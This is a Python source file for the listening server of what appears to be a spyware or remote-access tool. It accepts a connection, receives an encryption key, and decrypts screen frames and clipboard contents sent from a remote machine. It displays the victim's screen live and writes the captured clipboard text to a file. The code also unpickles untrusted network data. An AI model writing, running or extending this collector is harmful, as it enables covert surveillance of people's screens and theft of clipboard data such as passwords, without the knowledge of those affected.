import socket
import struct
import pickle
import cv2
import numpy as np
from cryptography.fernet import Fernet

def listener(ip, port):
    port = int(port)
    HOST = ip  
    PORT = port

    print(f"[*] Waiting for connection on {HOST}:{PORT}...")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(1)

    conn, addr = server.accept()
    print(f"[+] Connection received from {addr}")
    print(f"[+] Press 'q' to quit the window")

    # Receive the encryption key from the client
    key = conn.recv(1024)
    cipher = Fernet(key)

    data_buffer = b""
    payload_size = struct.calcsize("Q")

    while True:
        try:
            # Ensure have the payload size
            while len(data_buffer) < payload_size:
                packet = conn.recv(4096)
                if not packet:
                    raise ConnectionError("Connection closed by the client.")
                data_buffer += packet

            # Unpack the message size
            packed_msg_size = data_buffer[:payload_size]
            data_buffer = data_buffer[payload_size:]
            msg_size = struct.unpack("Q", packed_msg_size)[0]

            # Ensure we have the entire encrypted message
            while len(data_buffer) < msg_size:
                packet = conn.recv(4096)
                if not packet:
                    raise ConnectionError("Connection closed by the client.")
                data_buffer += packet

            encrypted_data = data_buffer[:msg_size]
            data_buffer = data_buffer[msg_size:]

            # Decrypt and deserialize the data (frame and clipboard)
            decrypted_data = cipher.decrypt(encrypted_data)
            data = pickle.loads(decrypted_data)

            # Extract frame and clipboard content
            frame = data.get("frame")
            clipboard = data.get("clipboard", "")

            # Ensure frame is a valid 3D NumPy array
            if not isinstance(frame, np.ndarray) or len(frame.shape) != 3:
                print("[!] Received an invalid frame. Not a 3D NumPy array.")
                continue

            # Display the screen frame
            cv2.imshow(f"{addr} -> Screen", frame)

            # Save clipboard content
            with open("clipboard_data.txt", "w") as clipboard_file:
                clip_ip = str(addr)
                cb_text = "Client: " + clip_ip + " Data: "+clipboard
                clipboard_file.write(cb_text)

            if cv2.waitKey(1) & 0xFF == ord('q'):
                break

        except ConnectionError as ce:
            print(f"[!] Connection Error: {ce}")
            break
        except Exception as e:
            print(f"[!] Error processing data: {e}")
            break

    cv2.destroyAllWindows()
    conn.close()
    server.close()
